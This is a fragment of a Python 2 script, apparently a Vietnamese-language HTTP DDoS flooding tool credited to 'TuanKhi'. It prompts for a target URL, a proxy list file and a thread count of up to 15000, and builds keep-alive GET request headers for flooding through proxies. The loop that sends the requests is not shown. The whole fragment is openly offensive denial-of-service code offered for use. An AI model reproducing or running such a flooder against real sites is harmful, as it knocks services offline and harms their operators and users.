...
#Main
print '\n\t..:: > Code By TuanKhi Ver2.0< ::..'
print '\t  ==> #~~ Ddos Cấp độ tối thượng ~~# <==  '
# Site
url = raw_input("Nhập ip web lên https://checkip.vip/ để check: ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
#Proxy
in_file = open(raw_input("Nhập File proxy: "),"r")
proxyf = in_file.read()
...
#So luong
thread = input("So luong byte gửi(max15000): ")
get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
x = 0
print("\tMod By Tuan Khi")
if url.count("/")==2:
    url = url + "/"
